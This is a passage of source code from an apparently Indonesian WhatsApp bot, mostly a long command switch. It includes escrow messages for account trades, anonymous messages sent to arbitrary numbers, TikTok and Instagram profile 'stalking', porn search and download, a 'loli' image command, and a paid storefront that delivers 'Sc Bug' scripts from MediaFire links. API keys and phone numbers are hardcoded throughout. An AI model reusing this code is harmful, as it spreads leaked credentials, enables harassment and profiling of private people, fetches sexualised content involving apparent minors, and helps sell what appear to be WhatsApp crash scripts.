> HAPUS SEMUA PESAN GMAIL
> KOSONGKAN SEMUA SAMPAH GMAIL
> HAPUS AKUN FB DARI PERANGKAT
> LOGOUT FF

*BY* ${namaCreator}`
reply(text12)
}
break
case "danamasuk": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const text12 = `DANA MASUK!

SILAHKAN SEND DATA SECARA PRIBADI KALO SUDAH DONE DAN DATA SUDAH DI AMANKAN SILAHKAN KETIK DONE KE GRUP BESERTA BUKTI SS LOGIN AKUN AGAR DANA BISA DI CAIRKAN KE PENJUAL UNTUK PENJUAL SILAHKAN KETIK .formatpencairan LALU ISI DENGAN BENAR AGAR KAMI TIDAK SALAH MENCAIRKAN DANA KESALAHAN DI TANGGUNG PENJUAL

X TRX BATAL FEE TETEP KEPOTONG X
BE SMART BUYER AND SELLER`
reply(text12)
}
break
case "donerekber": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const text12 = `ALL TRX DONE ✅
 

   BUUYER : ✅
   SELLEER : ✅


NOTE ⛔ : JIKA ADA KENDALA DI LAIN WAKTU ADMIN SUDAH TIDAK BERTANGGUNG JAWAB ❗❗


TERIMA KASIH SUDAH BERBELANJA DI ${namaCreator}`
reply(text12)
}
break
case 'menfess':
case 'menfes':
case 'confes':
case 'confess':
if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
if (!text) return m.reply(`*Cara Penggunaan*\n\nKirim perintah ${prefix}${command} nomer|pengirim|pesan\n\nContoh ${prefix}${command} 62831xxxxxxx|ini nama samaran ya|I have a crush on you\n\nContoh 2 : ${prefix}${command} 62831xxxxxxx|crush mu|I have s crush on you\n\nTenang aja privasi aman kok><`)
let nomor = q.split('|')[0] ? q.split('|')[0] : q
let saking = q.split('|')[1] ? q.split('|')[1] : q
let pesan = q.split('|')[2] ? q.split('|')[2] : ''
if (pesan.length < 1) return m.reply(`Harus di isi semua! ex : menfess 62831xxxxxxxx|orang|hallo kamu`)
let teksnya = `Hai kk ada Menfess nih!!\n\nDari :  _${saking}_  \nPesan : _${pesan}_ `
header = 'hayyy'
gambar = `https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRMkjAJhYezm4h6k1AJ6qfreGkaRdBcR7UHMw&usqp=CAU`
Biiofc.sendMessage(`${nomor}@s.whatsapp.net`, { caption: teksnya, image: {url: `https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRMkjAJhYezm4h6k1AJ6qfreGkaRdBcR7UHMw&usqp=CAU`}, footer: `𝚁𝙴𝚈𝚉\nhttps://wa.me/6285691304150` })
m.reply(`Sukses Mengirim Menfess!!`)     
break  
case 'menfesconfirm':
Biiofc.sendMessage(q, {text: `Sudah Di Confirmasi Nih Menfess nyaa🌹`})
m.reply(`Terimakasih Menfess Telah Diterima.`)
break
case 'cuaca':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ga Usah Sok Asik Anjg`)
if (!q) throw `_Contoh_\n${prefix+command} palembang`
let api_cuaca = '18d044eb8e1c06eaf7c5a27bb138694c'
let unit_cuaca = 'metric'
let nama_kota = q
let cuaca = await fetchJson(`http://api.openweathermap.org/data/2.5/weather?q=${nama_kota}&units=${unit_cuaca}&appid=${api_cuaca}`)
let text_cuaca =`*INFO CUACA*
*Nama:* ${cuaca.name + "," + cuaca.sys.country}
*Longitude:* ${cuaca.coord.lon}
*Latitude:* ${cuaca.coord.lat}
*Suhu:* ${cuaca.main.temp + " C"}
*Angin:* ${cuaca.wind.speed + " m/s"}
*Kelembaban:* ${cuaca.main.humidity + "%"}
*Cuaca:* ${cuaca.weather[0].main}
*Keterangan:* ${cuaca.weather[0].description}
*Udara:* ${cuaca.main.pressure + " HPa"}`
reply(text_cuaca)
break
case 'couple': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ga Usah Sok Asik Anjg`)  
await Biiofc
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
Biiofc.sendMessage(from, { image: { url: random.male }, caption: `Couple Male` }, {quoted:m})
Biiofc.sendMessage(from, { image: { url: random.female }, caption: `Couple Female` }, {quoted:m})
}
break
case 'stalktiktok':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ga Usah Sok Asik Anjg`)         
if (!isOwner) return reply(`Ngapain ? Khusus Rafathar Offcial Aja !!`)
await Biiofc
if (args.length == 0) return reply(`Example: ${prefix + command} bulansutena`)
axios.get(`https://api.lolhuman.xyz/api/stalktiktok/${args[0]}?apikey=${apikey}`).then(({ data }) => {
var caption = `Username : ${data.result.username}\n`
caption += `Nickname : ${data.result.nickname}\n`
caption += `Followers : ${data.result.followers}\n`
caption += `Followings : ${data.result.followings}\n`
caption += `Likes : ${data.result.likes}\n`
caption += `Video : ${data.result.video}\n`
caption += `Bio : ${data.result.bio}\n`
Biiofc.sendMessage(from, { image: { url: data.result.user_picture }, caption })
})
break
case 'stalkig':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ga Usah Sok Asik Anjg`)  
if (args.length == 0) return reply(`Example: ${prefix + command} jessnolimit`)
axios.get(`https://api.lolhuman.xyz/api/stalkig/${args[0]}?apikey=${apikey}`).then(({ data }) => {
var caption = `Username : ${data.result.username}\n`
caption += `Full Name : ${data.result.fullname}\n`
caption += `Posts : ${data.result.posts}\n`
caption += `Followers : ${data.result.followers}\n`
caption += `Following : ${data.result.following}\n`
caption += `Bio : ${data.result.bio}`
Biiofc.sendMessage(from, { image: { url: data.result.photo_profile }, caption })
})
}
break
case 'infogempa':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ga Usah Sok Asik Anjg`)
var { data } = await axios.get(`https://api.lolhuman.xyz/api/infogempa?apikey=${apikey}`)
var caption = `Lokasi : ${data.result.lokasi}\n`
caption += `Waktu : ${data.result.waktu}\n`
caption += `Potensi : ${data.result.potensi}\n`
caption += `Magnitude : ${data.result.magnitude}\n`
caption += `Kedalaman : ${data.result.kedalaman}\n`
caption += `Koordinat : ${data.result.koordinat}`
Biiofc.sendMessage(from, { image: { url: data.result.map }, caption })
break
case 'listsurah':
await Biiofc
axios
.get(`https://api.lolhuman.xyz/api/quran?apikey=${apikey}`)
.then(({ data }) => {
var text = 'List Surah:\n'
for (var x in data.result) {
text += `${x}. ${data.result[x]}\n`
}
reply(text)
})
.catch(console.error)
break
case 'jadwalsholat':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ga Usah Sok Asik Anjg`)
await Biiofc
if (args.length == 0) return reply(`Example: ${prefix + command} Jakarta`)
axios
.get(`https://api.lolhuman.xyz/api/sholat/${args[0]}?apikey=${apikey}`)
.then(({ data }) => {
var text = `Wilayah : ${data.result.wilayah}\n`
text += `Tanggal : ${data.result.tanggal}\n`
text += `Sahur : ${data.result.sahur}\n`
text += `Imsak : ${data.result.imsak}\n`
text += `Subuh : ${data.result.subuh}\n`
text += `Terbit : ${data.result.terbit}\n`
text += `Dhuha : ${data.result.dhuha}\n`
text += `Dzuhur : ${data.result.dzuhur}\n`
text += `Ashar : ${data.result.ashar}\n`
text += `Maghrib : ${data.result.imsak}\n`
text += `Isya : ${data.result.isya}`
reply(text)
})
.catch(console.error)
break
case 'cerpen':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ga Usah Sok Asik Anjg`)
var { data } = await axios.get(`https://api.lolhuman.xyz/api/cerpen?apiikey=${apiikey}`)
var textpp = `Title : ${data.result.title}\n`
textpp += `Creator : ${data.result.creator}\n`
textpp += `Story :\n${data.result.cerpen}`
reply(textpp)
break
case 'alquran':
if (!isOwner) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await Biiofc
if (args.length < 1) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10 or ${prefix + command} 18/1-10`)
axios
.get(`https://api.lolhuman.xyz/api/quran/${args[0]}?apikey=${apikey}`)
.then(({ data }) => {
var ayat = data.result.ayat
var text = `QS. ${data.result.surah} : 1-${ayat.length}\n\n`
for (var x of ayat) {
text += `${x.arab}\n${x.ayat}. ${x.latin}\n${x.indonesia}\n\n`
}
text = text.replace(/<u>/g, '_').replace(/<\/u>/g, '_')
text = text.replace(/<strong>/g, '*').replace(/<\/strong>/g, '*')
reply(text)
})
.catch(console.error)
break
//=================================================
case 'alquranaudio':
if (!isOwner) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await Biiofc
if (args.length == 0) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10`)
Biiofc.sendMessage(from, { audio: { url: `https://api.lolhuman.xyz/api/quran/audio/${args[0]}?apikey=${apikey}` }, mimetype: 'audio/mp4' })
break
//=================================================
case 'asmaulhusna':
if (!isOwner) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await Biiofc
axios
.get(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=${apikey}`)
.then(({ data }) => {
var text = `No : ${data.result.index}\n`
text += `Latin: ${data.result.latin}\n`
text += `Arab : ${data.result.ar}\n`
text += `Indonesia : ${data.result.id}\n`
text += `English : ${data.result.en}`
reply(text)
})
.catch(console.error)
break
case 'kisahnabi':
if (!isOwner) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await Biiofc
if (args.length == 0) return reply(`Example: ${prefix + command} Muhammad`)
axios
.get(`https://api.lolhuman.xyz/api/kisahnabi/${args[0]}?apikey=${apikey}`)
.then(({ data }) => {
var text = `Name : ${data.result.name}\n`
text += `Lahir : ${data.result.thn_kelahiran}\n`
text += `Umur : ${data.result.age}\n`
text += `Tempat : ${data.result.place}\n`
text += `Story : \n${data.result.story}`
reply(text)
})
.catch(console.error)
break
case 'katanime':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ga Usah Sok Asik Anjg`)
let res = await (await
fetch('https://katanime.vercel.app/api/getrandom?limit=1'))
  if (!res.ok) throw await res.text()
  let json = await res.json()
  if(!json.result[0]) throw json
  let { indo, character, anime } = json.result[0]
m.reply(`${indo}\n\n${character}\n${anime}`)
}
break
case 'qc': case'text': {
    if (!args[0] && !m.quoted) {
      return reply(`Where is the text?`)
    }
    let userPfp
    if (m.quoted) {
      try {
        userPfp = await Biiofc.profilePictureUrl(m.quoted.sender, "image")
      } catch (e) {
        userPfp = defaultpp
      }
    } else {
      try {
        userPfp = await Biiofc.profilePictureUrl(m.sender, "image")
      } catch (e) {
        userPfp = defaultpp
      }
    }
    const waUserName = pushname
    const quoteText = m.quoted ? m.quoted.body : args.join(" ")
    const quoteJson = {
      type: "quote",
      format: "png",
      backgroundColor: "#FFFFFF",
      width: 700,
      height: 580,
      scale: 2,
      messages: [
        {
          entities: [],
          avatar: true,
          from: {
            id: 1,
            name: waUserName,
            photo: {
              url: userPfp,
            },
          },
          text: quoteText,
          replyMessage: {},
        },
      ],
    }
    try {
      const quoteResponse = await axios.post("https://bot.lyo.su/quote/generate", quoteJson, {
        headers: { "Content-Type": "application/json" },
      })
      const buffer = Buffer.from(quoteResponse.data.result.image, "base64")
      Biiofc.sendImageAsSticker(m.chat, buffer, m, {
        packname: packname,
        author: author,
      })
    } catch (error) {
      console.error(error)
      reply('Error')
    }
    }
    break
case 'npmstalk':{
if (!q) return reply(`Example ${prefix+command} xeonapi`)
reply(mess.wait)
eha = await npmstalk.npmstalk(q)
reply(`*/ Npm Stalker \\*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break
case 'xnxxsearch':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ga Usah Sok Asik Anjg`)  
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} 𝗷𝗮𝗽𝗮𝗻𝘀𝗲`)
reply(mess.wait)
let anu = await fetchJson(`https://xzn.wtf/api/xnxxsearch?title=${text}&apikey=JaaTzy`)
let teks = ``
for (let v of anu) {
teks += `*Title* : ${v.title}\n`
teks += `*Duration* : ${v.duration}\n`
teks += `*Link* : ${v.link}\n\n───────────────\n\n`
}
reply(teks) 
}
break 
case 'xnxxdl':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ga Usah Sok Asik Anjg`)    
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} 𝘂𝗿𝗹`)
reply(mess.wait)
let anu = await fetchJson(`https://xzn.wtf/api/xnxxdl?urlxnxx=${text}&apikey=JaaTzy`)
const cpt = anu.title
const nick = anu.quality
Biiofc.sendMessage(m.chat, { video: { url: anu.url}, caption: `Judul : ${cpt}\nQuality : ${nick}`}, {quoted: m})
}
break   

case 'animespank':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ga Usah Sok Asik Anjg`)
reply(mess.wait)
waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)     
await Biiofc.sendMessage(m.chat, { caption:  `𝗧𝗮𝗻𝗴𝗴𝘂𝗻𝗴 𝗗𝗼𝘀𝗮 𝗞𝗮𝗸`, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
return(mess.error)
})
break
case 'walpaperanime': {
reply(mess.wait)
Biiofc.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/random/wallnime?apikey=haikalgans`}, caption: `𝗗𝗼𝗻𝗲 𝗸𝗮𝗸`})
}
break
case 'loli': {
reply(mess.wait)
Biiofc.sendMessage(m.chat, { image: { url: `https://api.akuari.my.id/randomimganime/loli`}, caption: `𝗗𝗼𝗻𝗲 𝗸𝗮𝗸`})
}
break
case 'cosplay': {
reply(mess.wait)
Biiofc.sendMessage(m.chat, { image: { url: `https://api.akuari.my.id/randomimganime/cosplay`}, caption: `𝗗𝗼𝗻𝗲 𝗸𝗮𝗸`})
}
break
case 'cecan':
case 'china':
case 'cogan':
case 'indonesia':
case 'korea':
case 'malaysia':
case 'thailand':
case 'vietnam': {
reply(mess.wait)
let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/Cecan/${prefix+command}.json`)
result = anu[Math.floor(Math.random() * anu.length)]               
Biiofc.sendMessage(m.chat, { image: { url: result}, caption: '𝗗𝗼𝗻𝗲 𝗞𝗮𝗸' }, { quoted: m })
}
break  
case 'waifu': {
reply(mess.wait)
Biiofc.sendMessage(m.chat, { image: { url: `https://api.akuari.my.id/randomimganime/waifu`}, caption: `𝗗𝗼𝗻𝗲 𝗸𝗮𝗸`})
}
break 
case 'reportbug':{
let ripotbug = args[0]
if (!text) return reply('Teksnya?')
reply('Oke Kak Reportmu Sudah Terkirim Ke Owner')
Biiofc.sendMessage('6283183432282@s.whatsapp.net', { text: `===[ 𝗥𝗘𝗣𝗢𝗥𝗧 ]===\n𝗣𝗲𝘀𝗮𝗻 : ${q} , 𝗱𝗮𝗿𝗶 : @${sender.split('@')[0]}\n𝗸𝗲𝘁𝗶𝗸 ${prefix}accreport 𝘂𝗻𝘁𝘂𝗸 𝗸𝗼𝗻𝗳𝗶𝗿𝗺𝗮𝘀𝗶 , 𝗸𝗲𝘁𝗶𝗸 ${prefix}acc 𝗺𝗲𝗻𝗼𝗹𝗮𝗸 𝗶𝗻𝗳𝗼𝗿𝗺𝗮𝘀𝗶`, mentions: [sender]}, { quoted: fkontak })
}
break
        case "ai": case "openai": 
        if (!isOwner) return reply(`Ga Usah Sok Asik Anjg`)    
          try {
            if (qwer.keyopenai === qwer.keyopenai);
            if (!text) return reply(`Chat dengan AI.\n\nContoh:\n${prefix}${command} Apa itu resesi`);
            const configuration = new Configuration({
              apiKey: qwer.keyopenai,
            });
            const openai = new OpenAIApi(configuration)   
            const response = await openai.createChatCompletion({
          model: "gpt-3.5-turbo",
          messages: [{role: "user", content: text}],
          });
          m.reply(`${response.data.choices[0].message.content}`);
          } catch (error) {
          if (error.response) {
            console.log(error.response.status);
            console.log(error.response.data);        console.log(`${error.response.status}\n\n${error.response.data}`);
          } else {
            console.log(error);
            m.reply("Maaf, sepertinya ada yang error :"+ error.message);
          }
        }
break
case 'remini': {
			if (!quoted) return reply(`Where is the picture?`)
			if (!/image/.test(mime)) return reply(`Send/Reply Photos With Captions ${prefix + command}`)
			XeonStickWait()
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			Biiofc.sendMessage(m.chat, { image: proses, caption: mess.success}, { quoted: m})
			}
			break
case 'acc': case 'addsaldo':{
if (!isOwner) return reply('NGAPAIN YATIM JAHANAM?')
if (!q.split(",")[0]) return reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (!q.split(",")[1]) return reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
addSaldo(q.split(",")[0]+"@s.whatsapp.net", Number(q.split(",")[1]), db_saldo)
reply(`「 *SALDO USER* 」
⭔ID: @${sender.split("@")[0]}
⭔Nomer: @${q.split(",")[0]}
⭔Tanggal: ${tanggal}
⭔Saldo: Rp${toRupiah(cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo))}, `)
                }
        case 'kirim': {
                    let messageText = `DONE KAK DEPOSIT SUDAH BERHASIL SEJUMLAH  ${q.split(",")[1]} TELAH DITAMBAHKAN KE SALDO ANDA CEK SALDO KETIK .SALDO TERIMAKASIH`
  let targetNumber = `${q.split(",")[0]}@s.whatsapp.net`;

  Biiofc.sendMessage(targetNumber, {
    text: `*${messageText}*`,
    mentions: [sender]
  }, {
    quoted: hw
  }).then(() => {
    m.reply('Acc Berhasil Tuan✅');
  }).catch(() => {
    m.reply('Gagal mengirim pesan!');
  });
}
break;
case "reqpanel": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *REQUEST PANEL* )▭▬▭

Ram : 
Username :
Nomor Wa : 
*Garansi 15 Day*
*Create ${tanggal}*
*Hari Ini ${hariini}*

⸼  ࣪ ׅ ︶︶︶  𖣇𖢅𖣇  ︶︶︶ ⸼  ࣪ ׅ
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
 case 'shutdown':
if (!isOwner) return reply(mess.owner)
reply(`Ba bye...`)
await sleep(3000)
process.exit()
break 
case 'mlstalk': {
if (!isPremium) return replyprem(mess.premium)
if (!q) return reply(`Example ${prefix+command} 530793138|8129`)
reply(mess.wait)
let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
reply(`*/ Mobile Legend Stalker \\*

Username : ${dat.userName}
Id : ${q.split("|")[0]}
ID Zone: ${q.split("|")[1]}`)
}
break    
 case 'donate':{
let text_donate =`_${pushname}👋_\n`
text_donate += "*Kalo Kalian Mau Ini Qris nya Kak donate yeah🍜 👇 https://telegra.ph/file/4a7086b5547d063811b3e.jpg*\n"
m.reply(text_donate)
}
break        
 case 'sc': case 'script':{
let text_sc =`_${pushname}👋_\n`
text_sc += "*SCRIPT V9 NO SCAN + CVPSLINODE NO ENC*\n"
text_sc += "Mau beli scriptnya?\n\n"
text_sc += "*Contact Person 📞*\n"
text_sc += "https://wa.me/6287818371699\n\n"
text_sc += "*Pembayaran Via* 💳\n"
text_sc += "_Qris / Bri / Gopay / Ovo_\n\n"
text_sc += "*Harga : Rp.20k (20K)*\n"
text_sc += "*Harga terlalu mahal?*\n"
text_sc += "*Sans nego dikit gpp*\n\n"
text_sc += "Sudah termasuk tutorial.\n"
text_sc += "Size script sudah ringan.\n"
text_sc += "Anti ngelag/delay."
m.reply(text_sc)
}
break        
        
 case 'tiktok':{ 
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!text) return reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
require('./freya/tiktok').Tiktok(q).then( data => {
Biiofc.sendMessage(m.chat, { caption: `Sukses, Ini Tuan Video Nya`, video: { url: data.watermark }}, {quoted:m})
})
}
break      
case 'runtime':
m.reply(`*Runtime :* ${runtime(process.uptime())}`)
        break    
 case 'spekram':{  
if (!isOwner & isPremium) return reply(`Ngapain ? Khusus Rafathar Offcial Aja !!`)
let totalStorage = Math.floor(os.totalmem() / 1024 / 1024) + 'MB'
  let freeStorage = Math.floor(os.freemem() / 1024 / 1024) + 'MB'
  let cpuModel = os.cpus()[0].model
  let cpuSpeed = os.cpus()[0].speed / 1000
  let cpuCount = os.cpus().length

  let message = `

*Your Bot Specifications*:

• *Total Storage*: ${totalStorage}
• *Free Storage*: ${freeStorage}
• *CPU Model*: ${cpuModel}
• *CPU Speed*: ${cpuSpeed} GHz
• *Number of CPU Cores*: ${cpuCount}
`


m.reply(message)
}
break
  case 'saldo':{
reply(`*━━ CHECK YOUR INFO ━━*

 _• *Name:* ${pushname}_
 _• *Nomer:* ${sender.split('@')[0]}_
 _• *Saldo:* Rp${toRupiah(cekSaldo(sender, db_saldo))}_

*Note :*
_Saldo hanya bisa untuk beli di bot_
_Tidak bisa ditarik atau transfer_!`)
}
break
          case 'qris': {
Biiofc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/4a7086b5547d063811b3e.jpg' }, caption: `JAN LUPA SS BUKTI DAN NOMINALNYA YA 
example : .bukti 5000` }, { quoted: hw })
}
        break
case 'orkut': {
Biiofc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/4a7086b5547d063811b3e.jpg' }, caption: `JAN LUPA SS BUKTI DAN NOMINALNYA YA 
example : .bukti 5000` }, { quoted: hw })
}
        break
case 'dana': {
Biiofc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/4a7086b5547d063811b3e.jpg' }, caption: `JAN LUPA SS BUKTI DAN NOMINALNYA YA 
example : .bukti 5000` }, { quoted: hw })
}
        break
          case 'bri': {
Biiofc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/4a7086b5547d063811b3e.jpg' }, caption: `JAN LUPA SS BUKTI DAN NOMINALNYA YA 
example : .bukti 5000` }, { quoted: hw })
}
        break
case "deposit":
        depo = `PILIH PAYMENT DEPOSIT DIBAWAH DAN SEBUTKAN NOMINALNYA
contoh : ${prefix}dana 5000

${prefix}dana✅
${prefix}qris✅
${prefix}bri✅
${prefix}orkut✅
${prefix}gopay❎`
        Biiofc.sendMessage(from, {text : depo}, {quoted : hw}) 
        break      
 case 'bukti':{
           let jumlah = args[0]
           if (!jumlah) return reply('Jumblah nya?')
reply('OKE KAK DEPOSIT SEDANG DI PROSES MOHON MENUNGGU SAMPAI OWNER MENGKONFIRMASI DEPOSIT TERSEBUT')
Biiofc.sendMessage(`${owner}@s.whatsapp.net`, { text: `*ADA YANG DEPOSIT NIH*\n*SEJUMLAH ${jumlah} DARI @${sender.split('@')[0]}*\n*INGIN ACC DEPOSIT? KETIK*\n*${prefix}acc MAU NOLAK? BIARIN AJA*`, mentions: [sender]}, { quoted: hw })
        }
        break
case 'accreport': {
let messageText = `_Terima Kasih Atas Laporan Anda Dan Laporan Anda Diterima Tunggu 1 - 2 Hari Agar Owner Bisa Memperbaikinya`
  let targetNumber = `${q.split(",")[0]}@s.whatsapp.net`;

  Biiofc.sendMessage(targetNumber, {
    text: `*${messageText}*`,
    mentions: [sender]
  }, {
    quoted: hw
  }).then(() => {
    m.reply('Acc berhasil!');
  }).catch(() => {
    m.reply('Gagal mengirim pesan!');
  });
}
break    
case 'buyscpanel': {
       if (cekSaldo(sender,db_saldo) < 15000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/g26mwz05enfd02p/Sc+Cpanel.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscbugv1': {
       if (cekSaldo(sender,db_saldo) < 15000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/xfw5xe4mprrlrq9/Sc_Bug_V1.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscbugv2': {
       if (cekSaldo(sender,db_saldo) < 25000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp25.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 25000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/xuzamc8oayprn4k/Sc_Bug_V2.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscbugv3': {
       if (cekSaldo(sender,db_saldo) < 35000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp35.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 35000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/l76f8btgfpqln9z/Sc_Bug_V3.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv2': {
       if (cekSaldo(sender,db_saldo) < 15000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/aji3jug4bcadtyt/Sc_v2.zip/file')
